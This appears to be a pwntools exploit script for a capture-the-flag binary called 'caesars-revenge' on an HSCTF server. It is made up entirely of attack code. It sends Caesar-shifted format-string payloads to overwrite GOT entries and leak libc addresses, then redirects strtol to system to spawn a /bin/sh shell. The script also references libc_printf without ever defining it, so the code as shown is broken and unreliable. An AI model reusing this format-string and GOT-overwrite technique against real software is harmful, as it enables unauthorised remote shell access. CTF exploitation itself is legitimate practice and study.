from pwn import *

puts_got = 0x404018
fgets_addr = 0x404040
setbuf_addr = 0x404030
getegid_addr = 0x4010a0
printf_got = 0x404038
strtol = 0x404048

r = remote('pwn.hsctf.com', 4567)
# r = gdb.debug('./caesars-revenge')

def loop():
    payload = b''
    payload += b'%27$m%4198806b%28$m.....'
    payload += p64(puts_got+4)
    payload += p64(puts_got+0)
    print(r.recvuntil('encoded: '))
    r.sendline(payload)
    print(r.recvuntil('shift: '))
    r.sendline('1')

def leak(addr):
    payload = b''
    payload += b'%25$r\x00\x00\x00'
    payload += p64(addr)
    print(r.recvuntil('encoded: '))
    r.sendline(payload)
    print(r.recvuntil('shift: '))
    r.sendline('1')
    print(r.recvuntil('Result: '))
    leak_ptr = r.recvn(6) + b'\x00\x00'
    leak_ptr = struct.unpack('<Q', leak_ptr)[0]
    print(hex(leak_ptr))
    return leak_ptr

def pwn():
    low = gadget&0xffff
    high = (gadget>>16)&0xffff
    val = gadget & 0xffffffff
    payload = b''
    if high < low:
        payload += '%{}b%28$gm%{}b%29$gm'.format(high, low-high).encode()
        # payload += '%{}b%30$m'.format(val).encode()
        payload += b'.' * (32-len(payload)) # Padding
        payload += p64(strtol+1)
        payload += p64(strtol)
    else:
        payload += '%{}b%28$gm%{}b%29$gm'.format(low, high-low).encode()
        # payload += '%{}b%30$m'.format(val).encode()
        payload += b'.' * (32-len(payload)) # Padding
        payload += p64(strtol)
        payload += p64(strtol+1)
    print(r.recvuntil('encoded: '))
    print("Sending....{}".format(payload.decode('utf-8')))
    r.sendline(payload)
    print(r.recvuntil('shift: '))
    r.sendline('1')

# leak = r.recvn(6) + b'\x00\x00'
# print(hex(struct.unpack('<Q', leak)[0]))
loop()
libc_fgets = leak(fgets_addr)
leak(setbuf_addr)
leak(getegid_addr)
leak(printf_got)

libc_base = libc_fgets - 0x06dad0 # fgets offset in libc
# Overwrite strtol to system
# so by passing /bin/sh to the second prompt, you get a shell
gadget = libc_base + 0x045390 # system -> strtol, systems offset in libc
assert (gadget>>32)&0xffffffff == (libc_printf>>32)&0xffffffff
print("Libc base: {}".format(hex(libc_base)))
print("Libc printf: {}".format(hex(libc_printf)))
print("Libc system: {}".format(hex(gadget)))
pwn()
r.sendline('Hello')
r.sendline('/bin/sh')
r.interactive()


